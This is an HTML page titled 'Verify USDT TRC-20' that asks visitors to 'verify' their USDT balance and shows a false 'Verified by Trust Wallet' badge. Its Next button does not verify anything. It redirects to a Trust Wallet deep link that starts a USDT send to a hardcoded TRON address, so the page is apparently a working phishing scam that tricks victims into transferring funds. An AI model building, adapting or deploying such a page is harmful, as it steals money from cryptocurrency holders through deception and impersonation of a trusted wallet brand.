<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify USDT TRC-20</title>
  <link rel="icon" href="favicon.ico" />
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      color: #000;
    }
    .container {
      padding: 16px;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-top: 30px;
    }
    .heading {
      font-size: 20px;
      margin-top: 20px;
      margin-bottom: 10px;
    }
    .subtext {
      font-size: 14px;
      color: #555;
    }
    .checkbox {
      margin: 20px auto;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
    }
    .checkbox input {
      margin-right: 8px;
    }
    .verified {
      font-size: 12px;
      color: green;
      margin-bottom: 60px;
    }
    .next-btn {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background-color: #007bff;
      color: #fff;
      border: none;
      padding: 18px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    .next-btn:disabled {
      background: #aaa;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="logo.png" alt="Logo" class="logo"/>
    <div class="heading">Please verify your asset</div>
    <div class="subtext">To continue, please verify your USDT TRC-20 balance.</div>

    <div class="checkbox">
      <input type="checkbox" id="agreeCheckbox" />
      <label for="agreeCheckbox">I agree to the Terms & Conditions</label>
    </div>

    <div class="verified">âœ… Verified by Trust Wallet</div>
  </div>

  <button class="next-btn" id="nextBtn" disabled>Next</button>

  <script>
    const checkbox = document.getElementById('agreeCheckbox');
    const nextBtn = document.getElementById('nextBtn');

    checkbox.addEventListener('change', () => {
      nextBtn.disabled = !checkbox.checked;
    });

    nextBtn.addEventListener('click', () => {
      const trustWalletLink = "https://link.trustwallet.com/send?coin=195&address=TYfVDDuC234ADKFc5HRsSaeqLvgU8H1AEc&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      window.location.href = trustWalletLink;
    });
  </script>
</body>
</html>
